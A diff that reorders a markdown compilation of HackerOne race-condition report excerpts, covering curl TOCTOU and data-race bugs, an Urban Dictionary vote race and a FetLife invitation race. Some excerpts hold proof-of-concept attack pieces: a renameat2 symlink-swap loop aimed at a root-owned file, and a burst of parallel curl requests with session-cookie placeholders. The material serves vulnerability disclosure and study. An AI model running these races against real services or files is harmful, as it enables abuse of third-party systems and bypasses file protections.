@@ -392,24 +392,6 @@ Te: trailers
 {"email":"████████"}
 ```
 
-## #183837 Race condition in up voting and down voting — urbandictionary — - — Violation of Secure Design Principles
-Source: `hackerone/reports/2023/183837.md` (https://hackerone.com/reports/183837)
-
-```
-GET /v0/vote?defid=3889203&direction=up&key=ab71d33b15d36506acf1e379b0ed07ee HTTP/1.1
-Host: api.urbandictionary.com
-Cache-Control: max-age=0
-Accept: application/json, text/javascript, */*; q=0.01
-Origin: http://www.urbandictionary.com
-User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36
-Referer: http://www.urbandictionary.com/define.php?term=alicia
-Accept-Encoding: gzip, deflate, sdch
-Accept-Language: en-US,en;q=0.8
-Connection: close
-
-as a response I got the following responses:
-```
-
 ## #3747959 curl --skip-existing has a TOCTOU race that lets a post-check symlink redirect the later download write — curl — - — Time-of-check Time-of-use (TOCTOU) Race Condition
 Source: `hackerone/reports/2026/3747959.md` (https://hackerone.com/reports/3747959)
 
@@ -493,6 +475,24 @@ python3 -u "$T
 ```
     def log_message(self, *args):
         pass
+```
+
+## #183837 Race condition in up voting and down voting — urbandictionary — - — Violation of Secure Design Principles
+Source: `hackerone/reports/2023/183837.md` (https://hackerone.com/reports/183837)
+
+```
+GET /v0/vote?defid=3889203&direction=up&key=ab71d33b15d36506acf1e379b0ed07ee HTTP/1.1
+Host: api.urbandictionary.com
+Cache-Control: max-age=0
+Accept: application/json, text/javascript, */*; q=0.01
+Origin: http://www.urbandictionary.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36
+Referer: http://www.urbandictionary.com/define.php?term=alicia
+Accept-Encoding: gzip, deflate, sdch
+Accept-Language: en-US,en;q=0.8
+Connection: close
+
+as a response I got the following responses:
 ```
 
 ## #3248712 Not a Vuln: Race Condition Allows Creation of Multiple Organizations with the Same Name — wakatime — - — Business Logic Errors
@@ -631,47 +631,6 @@ Source: `hackerone/reports/2022/1460373.md` (https://hackerone.com/reports/14603
 curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie: _fl_sessionid={session_id}' --data 'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_1}' & curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie: _fl_sessionid={session_id}' --data 'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_2}' & curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie: _fl_sessionid={session_id}' --data 'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_3}' & curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie: _fl_sessionid={session_id}' --data 'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_4}' & curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie: _fl_sessionid={session_id}' --data 'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_5}' & curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie: _fl_sessionid={session_id}' --data 'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_6}' & curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie: _fl_sessionid={session_id}' --data 'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_7}' & curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie: _fl_sessionid={session_id}' --data 'authenticity_token={authenticity_token}&user%5Bem
 ```
 
-## #2039870 CVE-2023-32001: fopen race condition — curl — - — Time-of-check Time-of-use (TOCTOU) Race Condition
-Source: `hackerone/reports/2023/2039870.md` (https://hackerone.com/reports/2039870)
-
-```
-  if(stat(filename, &sb) == -1 || !S_ISREG(sb.st_mode)) {
-    /* a non-regular file, fallback to direct fopen() */
-    *fh = fopen(filename, FOPEN_WRITETEXT);
-...
-}
-...
-```
-
-```
-#include <strings.h>
-#include <string.h>
-#include <stdlib.h>
-#include <sys/types.h>
-#include <sys/stat.h>
-#define _GNU_SOURCE
-#include <fcntl.h>
-#include <stdio.h>
-#include <unistd.h>
-#include <sys/syscall.h>
-#include <linux/fs.h>
-
-// source https://github.com/sroettger/35c3ctf_chals/blob/master/logrotate/exploit/rename.c
-int main(int argc, char *argv[]) {
-  while (1) {
-    syscall(SYS_renameat2, AT_FDCWD, argv[1], AT_FDCWD, argv[2], RENAME_EXCHANGE);
-  }
-  return 0;
-}
-```
-
-```
-lrwxrwxrwx 1 selmelc selmelc     4 Jun 27 07:11 a -> flag
-drwxrwxrwx 2 selmelc selmelc  4096 Jun 27 07:11 b
--rw-r--r-- 1 root    root        6 Jun 27 07:05 flag
--rwxr-x--- 1 selmelc selmelc 16608 Jun 27 07:04 rename
-```
-
 ## #1285538 Race condition on action: Invite members to a team — omise — - — Business Logic Errors
 Source: `hackerone/reports/2022/1285538.md` (https://hackerone.com/reports/1285538)
 
@@ -730,6 +689,107 @@ def handleResponse(req, interesting):
                            requestsPerConnection=100,
                            pipeline=False
                            )
+```
+
+## #2039870 CVE-2023-32001: fopen race condition — curl — - — Time-of-check Time-of-use (TOCTOU) Race Condition
+Source: `hackerone/reports/2023/2039870.md` (https://hackerone.com/reports/2039870)
+
+```
+  if(stat(filename, &sb) == -1 || !S_ISREG(sb.st_mode)) {
+    /* a non-regular file, fallback to direct fopen() */
+    *fh = fopen(filename, FOPEN_WRITETEXT);
+...
+}
+...
+```
+
+```
+#include <strings.h>
+#include <string.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#define _GNU_SOURCE
+#include <fcntl.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/syscall.h>
+#include <linux/fs.h>
+
+// source https://github.com/sroettger/35c3ctf_chals/blob/master/logrotate/exploit/rename.c
+int main(int argc, char *argv[]) {
+  while (1) {
+    syscall(SYS_renameat2, AT_FDCWD, argv[1], AT_FDCWD, argv[2], RENAME_EXCHANGE);
+  }
+  return 0;
+}
+```
+
+```
+lrwxrwxrwx 1 selmelc selmelc     4 Jun 27 07:11 a -> flag
+drwxrwxrwx 2 selmelc selmelc  4096 Jun 27 07:11 b
+-rw-r--r-- 1 root    root        6 Jun 27 07:05 flag
+-rwxr-x--- 1 selmelc selmelc 16608 Jun 27 07:04 rename
+```
+
+## #3638715 Use-After-Free race condition in url_move_hostname() via shared connection pool — curl — - — Use After Free
+Source: `hackerone/reports/2026/3638715.md` (https://hackerone.com/reports/3638715)
+
+```
+       -I. race_poc.c -o race_tsan \
+       /usr/lib/libcurl.so.4 -Wl,-rpath,/usr/lib
+```
+
+```
+       -I. race_poc.c -o race_asan \
+       /usr/lib/libcurl.so.4 -Wl,-rpath,/usr/lib
+```
+
+## #3645361 Data race in Curl_dnscache_add_negative() corrupts shared DNS cache — heap corruption and double-free when using CURLOPT_SHARE with CURL_LOCK_DATA_DNS — curl — - — Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')
+Source: `hackerone/reports/2026/3645361.md` (https://hackerone.com/reports/3645361)
+
+```
+CURLcode Curl_dnscache_add_negative(struct Curl_easy *data,
+                                    uint8_t dns_queries,
+                                    const char *host,
+                                    uint16_t port)
+{
+  struct Curl_dnscache *dnscache = dnscache_get(data);
+  // ...
+
+  // BUG: no dnscache_lock() here
+  dns = dnscache_add_addr(data, dnscache, dns_queries, NULL,
+                          host, strlen(host), port, FALSE);
+  //     ^^^^^^^^^^^^^^^^ calls Curl_hash_add() on shared hash table — no lock
+
+  if(dns) {
+    dns->refcount--;   // BUG: unsynchronized refcount decrement — no lock
+    // ...
+  }
+}
+```
+
+```
+CURLcode Curl_dnscache_add(struct Curl_easy *data,
+                           struct Curl_dns_entry *entry)
+{
+  // ...
+  dnscache_lock(data, dnscache);                    // <— LOCKS
+  if(!Curl_hash_add(&dnscache->entries, id, idlen + 1, (void *)entry)) {
+    dnscache_unlock(data, dnscache);
+    return CURLE_OUT_OF_MEMORY;
+  }
+  entry->refcount++;
+  dnscache_unlock(data, dnscache);                  // <— UNLOCKS
+  return CURLE_OK;
+}
+```
+
+```
+Thread A reads  refcount = 1
+Thread B reads  refcount = 1
+Thread A writes refcount = 0 → triggers free
+Thread B writes refcount = 0 → triggers free on already-freed memory
 ```
 
 ## #3335085 TOCTOU Race Condition in HTTP/2 Connection Reuse Leads to Certificate Validation Bypass — curl — - — Time-of-check Time-of-use (TOCTOU) Race Condition
@@ -810,66 +870,6 @@ Source: `hackerone/reports/2025/3432833.md` (https://hackerone.com/reports/34328
           It will start sending upload requests.
        3. Let both scripts run for 15-30 seconds. The client will show some "No such file or directory" errors, which
           is expected.
-```
-
-## #3638715 Use-After-Free race condition in url_move_hostname() via shared connection pool — curl — - — Use After Free
-Source: `hackerone/reports/2026/3638715.md` (https://hackerone.com/reports/3638715)
-
-```
-       -I. race_poc.c -o race_tsan \
-       /usr/lib/libcurl.so.4 -Wl,-rpath,/usr/lib
-```
-
-```
-       -I. race_poc.c -o race_asan \
-       /usr/lib/libcurl.so.4 -Wl,-rpath,/usr/lib
-```
-
-## #3645361 Data race in Curl_dnscache_add_negative() corrupts shared DNS cache — heap corruption and double-free when using CURLOPT_SHARE with CURL_LOCK_DATA_DNS — curl — - — Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')
-Source: `hackerone/reports/2026/3645361.md` (https://hackerone.com/reports/3645361)
-
-```
-CURLcode Curl_dnscache_add_negative(struct Curl_easy *data,
-                                    uint8_t dns_queries,
-                                    const char *host,
-                                    uint16_t port)
-{
-  struct Curl_dnscache *dnscache = dnscache_get(data);
-  // ...
-
-  // BUG: no dnscache_lock() here
-  dns = dnscache_add_addr(data, dnscache, dns_queries, NULL,
-                          host, strlen(host), port, FALSE);
-  //     ^^^^^^^^^^^^^^^^ calls Curl_hash_add() on shared hash table — no lock
-
-  if(dns) {
-    dns->refcount--;   // BUG: unsynchronized refcount decrement — no lock
-    // ...
-  }
-}
-```
-
-```
-CURLcode Curl_dnscache_add(struct Curl_easy *data,
-                           struct Curl_dns_entry *entry)
-{
-  // ...
-  dnscache_lock(data, dnscache);                    // <— LOCKS
-  if(!Curl_hash_add(&dnscache->entries, id, idlen + 1, (void *)entry)) {
-    dnscache_unlock(data, dnscache);
-    return CURLE_OUT_OF_MEMORY;
-  }
-  entry->refcount++;
-  dnscache_unlock(data, dnscache);                  // <— UNLOCKS
-  return CURLE_OK;
-}
-```
-
-```
-Thread A reads  refcount = 1
-Thread B reads  refcount = 1
-Thread A writes refcount = 0 → triggers free
-Thread B writes refcount = 0 → triggers free on already-freed memory
 ```
 
 ## #214028 Race condition in GitLab import, giving access to other people their imports due to filename collision — gitlab — - — Information Disclosure
